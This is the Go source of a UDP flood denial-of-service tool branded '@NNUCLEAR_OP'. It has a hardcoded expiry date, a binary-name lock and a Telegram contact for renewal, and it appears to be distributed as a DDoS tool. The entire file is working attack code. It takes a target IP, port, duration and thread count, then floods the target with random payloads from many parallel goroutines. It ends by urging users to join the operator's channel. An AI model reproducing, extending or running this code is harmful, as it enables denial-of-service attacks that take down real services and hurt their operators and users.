package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// Default payload size (in bytes)
const defaultPayloadSize = 1400

// Display a bordered message
func displayMessage(message string) {
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println(message)
	fmt.Println("╚════════════════════════════════════════╝")
}

// Validate binary name
func validateBinaryName(binaryName string) {
	if !strings.HasSuffix(binaryName, "raja.exe") {
		displayMessage("║           INVALID BINARY NAME!         ║\n" +
			"║    Binary must be named 'raja.exe'        ║")
		os.Exit(1)
	}
}

// Check if binary has expired
func checkBinaryExpiry() {
	expiryDate := time.Date(2025, 1, 15, 23, 59, 59, 0, time.UTC)
	if time.Now().After(expiryDate) {
		displayMessage("║           BINARY EXPIRED!              ║\n" +
			"║    Please contact the owner at:        ║\n" +
			"║    Telegram: @NNUCLEAR_OP              ║")
		os.Exit(1)
	}
}

// Validate IP address
func validateIP(ip string) {
	if net.ParseIP(ip) == nil {
		fmt.Printf("Invalid IP address: %s\n", ip)
		os.Exit(1)
	}
}

// Generate random payload
func generatePayload(size int) string {
	hexChars := "0123456789abcdef"
	payload := make([]byte, size*4)
	for i := 0; i < size; i++ {
		payload[i*4] = '\\'
		payload[i*4+1] = 'x'
		payload[i*4+2] = hexChars[rand.Intn(16)]
		payload[i*4+3] = hexChars[rand.Intn(16)]
	}
	return string(payload)
}

// Attack routine with high traffic generation
func attack(ip string, port int, duration int, payloadSize int, wg *sync.WaitGroup) {
	defer wg.Done()

	// Use the Windows-compatible UDP connection (this works on both Windows and Linux)
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Printf("Socket creation failed: %v\n", err)
		return
	}
	defer conn.Close()

	payload := generatePayload(payloadSize)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(endTime) {
		_, err := conn.Write([]byte(payload))
		if err != nil {
			fmt.Printf("Send failed: %v\n", err)
			return
		}
	}
}

func main() {
	// Check binary name and expiry date
	validateBinaryName(os.Args[0])
	checkBinaryExpiry()

	// Ensure correct number of arguments
	if len(os.Args) != 5 {
		displayMessage("Usage: ./nuclear <ip> <port> <duration> <threads>")
		os.Exit(1)
	}

	// Get command-line arguments
	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid port:", os.Args[2])
		os.Exit(1)
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid duration:", os.Args[3])
		os.Exit(1)
	}
	threads, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Invalid thread count:", os.Args[4])
		os.Exit(1)
	}

	// Validate the provided IP address
	validateIP(ip)

	// Display message
	displayMessage("║            @NNUCLEAR_OP SYSTEM              ║\n" +
		"║         HIGH TRAFFIC UDP FLOOD TOOL          ║")

	fmt.Printf("Starting attack on %s:%d for %d seconds with %d threads\n",
		ip, port, duration, threads)

	// Handle interrupt signals for both Unix-like and Windows systems
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\nStopping attack...")
		os.Exit(0)
	}()

	// Launch threads
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(ip, port, duration, defaultPayloadSize, &wg)
	}

	// Wait for all threads to complete
	wg.Wait()

	// Display message after attack
	fmt.Println("\nAttack completed. Join @NNUCLEAR_OP for more updates.")
}
